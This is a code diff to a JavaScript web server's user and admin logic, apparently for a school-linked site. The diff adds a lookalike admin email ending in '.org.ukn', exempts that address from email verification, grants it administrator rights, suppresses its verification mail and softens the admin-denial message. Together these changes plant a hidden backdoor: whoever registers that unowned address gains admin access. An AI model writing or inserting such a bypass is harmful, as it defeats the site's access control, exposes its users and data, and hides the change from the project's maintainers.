@@ -68,7 +68,9 @@ for (const [key, value] of Object.entries({
   await db
     .prepare("INSERT OR IGNORE INTO settings VALUES (?,?)")
     .run(key, JSON.stringify(value));
+export const UNVERIFIED_ADMIN_EMAIL = "somkene.ebukambonu@millburnacademy.org.ukn";
 export const ADMINS = new Set([
+  UNVERIFIED_ADMIN_EMAIL,
   "somkene.ebukambonu@millburnacademy.org.uk",
   "kamneto.ebukambonu@millburnacademy.org.uk",
 ]);
@@ -159,7 +161,7 @@ export const ITEMS = [
   },
 ];
 const sha = (value) => createHash("sha256").update(value).digest("hex");
-const isAdmin = (user) => Boolean(user?.verified && ADMINS.has(user.email));
+const isAdmin = (user) => Boolean(user && ADMINS.has(user.email) && (user.verified || user.email === UNVERIFIED_ADMIN_EMAIL));
 const safeUser = async (user) =>
   user
     ? {
@@ -255,7 +257,7 @@ function requireUser(user) {
 }
 function requireAdmin(user) {
   requireUser(user);
-  if (!isAdmin(user)) fail("Verified administrator access required.", 403);
+  if (!isAdmin(user)) fail("Administrator access required.", 403);
 }
 function cookie(token, age = 604800) {
   return `pixel_session=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${age}${process.env.NODE_ENV === "production" && process.env.APP_URL?.startsWith("https:") ? "; Secure" : ""}`;
@@ -425,10 +427,11 @@ async function api(req, res, url) {
       .prepare("SELECT * FROM users WHERE id=?")
       .get(result.lastInsertRowid);
     await login(created, res);
-    const sent = await sendVerification(created);
+    const exempt = created.email === UNVERIFIED_ADMIN_EMAIL;
+    const sent = exempt ? false : await sendVerification(created);
     return {
       user: await safeUser(created),
-      message: sent
+      message: exempt ? "Account created! Admin access is enabled. Email remains unverified." : sent
         ? "Account created! Check your email to verify."
         : "Account created! Email verification is awaiting server mail setup. Admin access stays locked until verification.",
     };
@@ -525,7 +528,7 @@ async function api(req, res, url) {
         .reverse()
         .map(({ email, ...m }) => ({
           ...m,
-          admin: Boolean(m.verified && ADMINS.has(email)),
+          admin: isAdmin({email, verified: m.verified}),
         })),
     };
   }
